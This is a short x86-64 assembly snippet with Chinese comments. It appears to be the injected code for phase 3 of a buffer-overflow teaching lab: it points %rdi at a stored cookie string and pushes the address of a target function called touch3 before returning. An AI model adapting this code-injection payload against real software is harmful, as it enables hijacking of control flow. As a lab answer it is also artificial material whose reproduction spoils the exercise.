sub $0x18,%rsp # 减出一个放cookie的位置
mov $0x5561dc90, %rdi # cookie首位置
pushq $0x4018fa # 0x4018fa是touch3的开始地址
retq
